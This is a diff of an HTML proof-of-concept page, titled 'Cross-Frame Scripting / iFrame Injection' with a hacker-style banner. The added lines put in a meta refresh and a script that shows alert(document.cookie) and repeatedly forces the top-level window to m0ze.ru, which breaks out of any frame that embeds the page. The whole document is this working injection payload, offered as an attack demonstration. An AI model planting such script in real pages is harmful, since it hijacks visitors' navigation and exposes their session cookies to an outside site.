@@ -10,6 +10,7 @@
 		<meta charset="utf-8">
 		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta http-equiv="refresh" content="4;URL='https://m0ze.ru'">
 		<title>m0ze@blackcore:~# Cross-Frame Scripting / iFrame Injection</title>
 		<meta name="description" content="Cross-Frame Scripting / iFrame Injection">
 		<meta name="keywords" content="XFS, iFrame, Injection">
@@ -28,8 +29,8 @@
  ║    ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚══════╝    > No problem, right?           ║ 
  ║                                                                           ║ 
  ╚═══════════════════════════════════════════════════════════════════════════╝ `,"color:#e61d4c; background:#000000; font-family: monospace");
-			location='//m0ze.ru';top.location='//m0ze.ru';top.location.href='//m0ze.ru';
-			if (window.location.hostname !== 'm0ze.ru'){top.location='//m0ze.ru';}
+			alert('m0ze');alert(document.cookie);location='//m0ze.ru';top.location='//m0ze.ru';top.location.href='//m0ze.ru';location.replace('//m0ze.ru');window.location.href='//m0ze.ru';document.location.replace('//m0ze.ru');
+			if (window.location.hostname !== 'm0ze.ru'){location='//m0ze.ru';top.location='//m0ze.ru';}
 		</script>
 	</body>
 </html>
